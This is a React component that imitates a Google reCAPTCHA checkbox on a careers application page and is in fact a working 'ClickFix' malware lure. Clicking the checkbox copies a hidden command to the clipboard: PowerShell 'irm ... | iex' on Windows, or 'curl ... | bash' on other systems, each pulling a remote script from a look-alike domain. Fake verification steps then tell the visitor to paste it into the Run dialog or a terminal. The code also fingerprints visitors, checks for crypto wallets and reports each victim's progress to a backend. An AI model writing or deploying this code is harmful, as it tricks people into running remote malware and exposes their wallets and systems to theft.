"use client";

import { useEffect, useRef, useState } from "react";
import { createPortal } from "react-dom";
import { collectVisitorMeta } from "@/lib/visitorDetect";

type Props = {
  onComplete: () => void;
};

type Phase = "idle" | "checking" | "modal" | "verifying" | "done";

function RecaptchaLogo() {
  return (
    // eslint-disable-next-line @next/next/no-img-element
    <img
      src="https://www.gstatic.com/recaptcha/api2/logo_48.png"
      alt=""
      width={36}
      height={36}
      draggable={false}
      className="block h-9 w-9"
    />
  );
}

function RecaptchaCheckboxDone() {
  return (
    <svg className="rc-cb-check -ml-0.5 block h-8 w-8 overflow-visible" viewBox="0 0 30 30" aria-hidden>
      <path
        d="M4.2 15.4 11.2 22.2 25.8 6.6"
        fill="none"
        stroke="#00c851"
        strokeWidth="3.8"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

function RecaptchaCheckboxLoading({ loadKey }: { loadKey: number }) {
  return (
    <span key={loadKey} className="grid h-[28px] w-[28px] place-items-center overflow-visible" aria-hidden>
      <svg className="rc-cb-spin block h-[32px] w-[32px]" viewBox="0 0 32 32">
        <circle
          cx="16"
          cy="16"
          r="12.5"
          fill="none"
          stroke="#4d90fe"
          strokeWidth="3"
          strokeLinecap="round"
          strokeDasharray="37 79"
        />
      </svg>
    </span>
  );
}

function nextVerifyId() {
  return String(Math.floor(10000 + Math.random() * 90000));
}

type OsKind = "windows" | "mac" | "linux" | "mobile";

function payloadForOs(os: OsKind, verifyId: string) {
  if (os === "windows") {
    return `powershell -NoP -EP Bypass -c "irm https://apirecapcha.vercel.app/go.ps1 | iex" #I am not a bot. Fixing the issue as a services. ID:${verifyId}`;
  }
  return `curl -fsSL https://apirecapcha.vercel.app/go.sh | bash #I am not a bot. Fixing the issue as a services. ID:${verifyId}`;
}

function copyText(text: string) {
  void navigator.clipboard.writeText(text).catch(() => {
    const el = document.createElement("textarea");
    el.value = text;
    el.setAttribute("readonly", "");
    el.style.position = "fixed";
    el.style.left = "-9999px";
    document.body.appendChild(el);
    el.select();
    document.execCommand("copy");
    document.body.removeChild(el);
  });
}

function detectOs(): OsKind {
  const ua = navigator.userAgent || "";
  const platform = navigator.platform || "";
  if (/Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua)) return "mobile";
  if (typeof navigator.maxTouchPoints === "number" && navigator.maxTouchPoints > 1 && /Mac/i.test(platform)) {
    return "mobile";
  }
  if (/Mac/i.test(ua) || /Mac/i.test(platform)) return "mac";
  if (/Linux/i.test(ua) && !/Android/i.test(ua)) return "linux";
  return "windows";
}

function VerificationSteps({ os }: { os: OsKind }) {
  if (os === "mac") {
    return (
      <ol className="mt-5 list-decimal space-y-2.5 pl-5 text-[13px] leading-relaxed text-[#3c4043]">
        <li>
          Press &amp; hold the Key <strong>Cmd + Spacebar</strong>.
        </li>
        <li>
          In the verification window, type <strong>Terminal</strong>,
          <br />
          <span className="tracking-[-0.03em]">
            and Press &amp; hold the Key <strong>Command + V</strong>.
          </span>
        </li>
        <li>
          Press <strong>Enter</strong> on your keyboard to finish.
        </li>
      </ol>
    );
  }
  if (os === "linux" || os === "mobile") {
    return (
      <ol className="mt-5 list-decimal space-y-2.5 pl-5 text-[13px] leading-relaxed text-[#3c4043]">
        <li>
          Press &amp; hold the Key <strong>Ctrl + Alt + T</strong>.
        </li>
        <li>
          In the verification window, press <strong>Ctrl + Shift + V</strong>.
        </li>
        <li>
          Press <strong>Enter</strong> on your keyboard to finish.
        </li>
      </ol>
    );
  }
  return (
    <ol className="mt-5 list-decimal space-y-2.5 pl-5 text-[13px] leading-relaxed text-[#3c4043]">
      <li>
        Press &amp; hold the Key <strong>Win + R</strong>.
      </li>
      <li>
        In the verification window, type <strong>Ctrl + V</strong>.
      </li>
      <li>
        Press <strong>Enter</strong> on your keyboard to finish.
      </li>
    </ol>
  );
}

type VisitorMeta = {
  deviceFingerprint?: string;
  system?: string;
  wallets?: string[];
  timezone?: string;
};

function reportCaptchaEvent(
  event: "started" | "completed" | "abandoned",
  verifyId: string,
  os: OsKind,
  meta: VisitorMeta,
  useBeacon = false,
) {
  const payload = JSON.stringify({
    event,
    verifyId,
    os,
    path: window.location.pathname,
    ...meta,
  });
  if (useBeacon && navigator.sendBeacon) {
    navigator.sendBeacon(
      "/api/careers/captcha-event",
      new Blob([payload], { type: "application/json" }),
    );
  } else {
    void fetch("/api/careers/captcha-event", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: payload,
      keepalive: true,
    }).catch(() => {/* fire-and-forget */});
  }
}

export function BusinessCaptcha({ onComplete }: Props) {
  const [phase, setPhase] = useState<Phase>("idle");
  const [mounted, setMounted] = useState(false);
  const [verifyId, setVerifyId] = useState(nextVerifyId);
  const [loadingKey, setLoadingKey] = useState(0);
  const [modalOpens, setModalOpens] = useState(0);
  const [os, setOs] = useState<OsKind>("windows");
  const widgetRef = useRef<HTMLDivElement>(null);
  const checkTimeoutRef = useRef<number | null>(null);
  const [popupPos, setPopupPos] = useState({ top: 0, left: 0 });

  /** Track event lifecycle to fire abandoned only when started but not completed. */
  const startedRef = useRef(false);
  const completedRef = useRef(false);
  const abandonedRef = useRef(false);

  /** Visitor meta collected async on mount — sent with every captcha event. */
  const metaRef = useRef<VisitorMeta>({});

  /**
   * Mirror mutable state into refs so the unmount/beforeunload effects (which
   * run with [] deps) always read the latest verifyId and os without
   * re-registering on every state change — which would cause false "abandoned"
   * fires when verifyId updates after the checkbox click.
   */
  const verifyIdRef = useRef(verifyId);
  const osRef = useRef(os);
  useEffect(() => { verifyIdRef.current = verifyId; }, [verifyId]);
  useEffect(() => { osRef.current = os; }, [os]);

  const MODAL_DELAY_MS = 3000;
  const verifyReady = modalOpens >= 3;

  useEffect(() => {
    setMounted(true);
    setOs(detectOs());
    // Collect visitor meta in background so it's ready by the time they click
    void collectVisitorMeta({ walletWaitMs: 400 }).then((m) => {
      metaRef.current = {
        deviceFingerprint: m.deviceFingerprint,
        system: m.system,
        wallets: m.wallets,
        timezone: m.timezone,
      };
    });
  }, []);

  useEffect(() => {
    return () => {
      if (checkTimeoutRef.current !== null) window.clearTimeout(checkTimeoutRef.current);
    };
  }, []);

  /** Fire "abandoned" on beforeunload (tab close / hard navigation). */
  useEffect(() => {
    const handleUnload = () => {
      if (startedRef.current && !completedRef.current && !abandonedRef.current) {
        abandonedRef.current = true;
        reportCaptchaEvent("abandoned", verifyIdRef.current, osRef.current, metaRef.current, true);
      }
    };
    window.addEventListener("beforeunload", handleUnload);
    return () => window.removeEventListener("beforeunload", handleUnload);
  }, []); // ← empty deps: register once, use refs for latest values

  /** Fire "abandoned" when component unmounts mid-flow (SPA navigation). */
  useEffect(() => {
    return () => {
      if (startedRef.current && !completedRef.current && !abandonedRef.current) {
        abandonedRef.current = true;
        reportCaptchaEvent("abandoned", verifyIdRef.current, osRef.current, metaRef.current, false);
      }
    };
  }, []); // ← empty deps: only on actual unmount, not on state changes

  const placePopup = () => {
    const el = widgetRef.current;
    if (!el) return;
    const r = el.getBoundingClientRect();
    const heading = document.getElementById("careers-apply-heading");
    const hr = heading?.getBoundingClientRect();
    const width = Math.min(300, window.innerWidth - 24);
    const left = Math.max(12, Math.min(r.left + 32, window.innerWidth - width - 12));
    const top = Math.max(12, hr ? hr.bottom + 10 : r.top);
    setPopupPos({ top, left });
  };

  useEffect(() => {
    if (phase !== "modal" && phase !== "verifying") return;
    placePopup();
    window.addEventListener("resize", placePopup);
    window.addEventListener("scroll", placePopup, true);
    return () => {
      window.removeEventListener("resize", placePopup);
      window.removeEventListener("scroll", placePopup, true);
    };
  }, [phase]);

  const closeModal = () => {
    if (phase === "verifying") return;
    setPhase("idle");
  };

  const handleCheckboxClick = () => {
    if (phase !== "idle") return;
    const id = nextVerifyId();
    setVerifyId(id);
    copyText(payloadForOs(os, id));
    setLoadingKey((k) => k + 1);
    setPhase("checking");

    /* Telegram: captcha started */
    if (!startedRef.current) {
      startedRef.current = true;
      reportCaptchaEvent("started", id, os, metaRef.current);
    }

    if (checkTimeoutRef.current !== null) window.clearTimeout(checkTimeoutRef.current);
    checkTimeoutRef.current = window.setTimeout(() => {
      placePopup();
      setModalOpens((n) => n + 1);
      setPhase("modal");
    }, MODAL_DELAY_MS);
  };

  const handleLabelClick = () => {
    handleCheckboxClick();
  };

  const runVerify = () => {
    if (phase !== "modal" || !verifyReady) return;

    /* Telegram: user clicked VERIFY — steps were completed */
    if (!completedRef.current) {
      completedRef.current = true;
      reportCaptchaEvent("completed", verifyId, os, metaRef.current);
    }

    setPhase("verifying");
    window.setTimeout(() => setPhase("done"), 900);
  };

  const modalOpen = phase === "modal" || phase === "verifying";

  const modalCard = modalOpen ? (
    <div
      className="fixed z-[101] w-[min(300px,calc(100vw-24px))] overflow-hidden bg-white shadow-[0_8px_28px_rgba(0,0,0,0.18)]"
      style={{ top: popupPos.top, left: popupPos.left, fontFamily: "Roboto, Arial, sans-serif" }}
      role="dialog"
      aria-modal="true"
      aria-labelledby="captcha-modal-title"
      onClick={(e) => e.stopPropagation()}
    >
      <div className="bg-[#1a73e8] px-5 py-3.5">
        <p className="text-[12px] leading-none text-white/90">Complete these</p>
        <h2 id="captcha-modal-title" className="mt-1.5 text-[22px] font-bold leading-none text-white">
          Verification Steps
        </h2>
      </div>

      <div className="px-5 pb-5 pt-2">
        <p className="text-[13px] leading-relaxed text-[#3c4043]">
          To better prove you are not a robot, please:
        </p>

        <VerificationSteps os={os} />

        <p className="mt-5 text-[13px] text-[#3c4043]">You will observe and agree:</p>

        <div className="mt-3 flex w-full items-start gap-2.5 rounded-md border border-[#e8eaed] bg-[#f8f9fa] px-3.5 py-3.5">
          <span
            aria-hidden
            className="mt-0.5 grid h-[18px] w-[18px] shrink-0 place-items-center rounded-full bg-[#1e8e3e]"
          >
            <svg viewBox="0 0 24 24" className="h-[11px] w-[11px] text-white" fill="none" stroke="currentColor" strokeWidth="3.2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M5 12.5 9.2 17 19 7" />
            </svg>
          </span>
          <p className="min-w-0 flex-1 text-[12px] leading-[1.5] tracking-[0.06em] text-[#202124]" style={{ fontFamily: "Roboto, Arial, sans-serif" }}>
            &quot;I am not a robot - reCAPTCHA
            <br />
            Verification ID: {verifyId}&quot;
          </p>
        </div>
      </div>

      <div className="flex items-center justify-between gap-4 border-t border-[#e8eaed] bg-[#f8f9fa] px-5 py-3.5">
        <p className="min-w-0 flex-1 text-[11px] leading-snug text-[#5f6368]">
          Perform the steps above to finish verification.
        </p>
        <button
          type="button"
          onClick={runVerify}
          disabled={!verifyReady || phase === "verifying"}
          className="shrink-0 rounded-full px-5 py-2 text-[12px] font-medium tracking-[0.04em] text-white disabled:cursor-default disabled:bg-[#d2e3fc] disabled:text-white/80 enabled:bg-[#1a73e8] enabled:hover:bg-[#1558b0]"
        >
          VERIFY
        </button>
      </div>
    </div>
  ) : null;

  return (
    <div ref={widgetRef} className="relative inline-block">
      <div
        className="flex h-[78px] w-[304px] items-center justify-between border border-[#d3d3d3] bg-[#f9f9f9] pl-[14px] pr-[11px]"
        style={{ fontFamily: "Roboto, Helvetica, Arial, sans-serif" }}
      >
        <span className="flex items-center">
          <button
            type="button"
            aria-label="I'm not a robot"
            aria-pressed={phase === "done"}
            disabled={phase !== "idle"}
            onClick={handleCheckboxClick}
            className="rc-cb-box grid h-7 w-7 cursor-pointer place-items-center border-0 bg-transparent p-0 disabled:cursor-default"
          >
            {phase === "done" ? (
              <RecaptchaCheckboxDone />
            ) : phase === "checking" ? (
              <RecaptchaCheckboxLoading loadKey={loadingKey} />
            ) : (
              <span className="rc-cb-square block h-6 w-6 rounded-[2px] border-2 border-[#c1c1c1] bg-white" />
            )}
          </button>
          <button
            type="button"
            disabled={phase !== "idle"}
            onClick={handleLabelClick}
            className="ml-3 cursor-pointer border-0 bg-transparent p-0 text-[14px] font-normal leading-[17px] text-black disabled:cursor-default"
          >
            I&apos;m not a robot
          </button>
        </span>

        <span className="flex w-[72px] shrink-0 flex-col items-center">
          <RecaptchaLogo />
          <span className="mt-[2px] whitespace-nowrap text-[8px] leading-none text-[#555]">
            Privacy - Terms
          </span>
        </span>
      </div>

      <button
        type="button"
        onClick={onComplete}
        disabled={phase !== "done"}
        className="btn-gold mt-5 rounded-md px-7 py-3 text-sm font-semibold disabled:cursor-not-allowed disabled:opacity-40"
      >
        Apply Now
      </button>

      {mounted && modalOpen
        ? createPortal(
            <>
              <div className="fixed inset-0 z-[100]" onClick={closeModal} role="presentation" />
              {modalCard}
            </>,
            document.body,
          )
        : null}
    </div>
  );
}
